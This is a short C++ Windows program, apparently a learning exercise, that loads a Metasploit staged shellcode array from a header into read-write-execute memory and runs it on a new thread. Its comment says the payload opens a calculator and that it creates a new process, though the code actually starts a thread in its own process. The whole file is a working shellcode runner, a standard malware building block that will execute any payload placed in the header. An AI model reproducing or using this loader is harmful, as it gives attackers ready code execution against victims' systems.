// This program's goal is to try to create a new process to execute a shellcode that will open a calculator

#include <windows.h>
#include "staged_shellcode.hpp"

int main()
{
	// Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(metasploit_staged_shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

	// Move the shellcode to the allocated memory
	memcpy(memory,
		   metasploit_staged_shellcode,
		   sizeof(metasploit_staged_shellcode));

	// Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
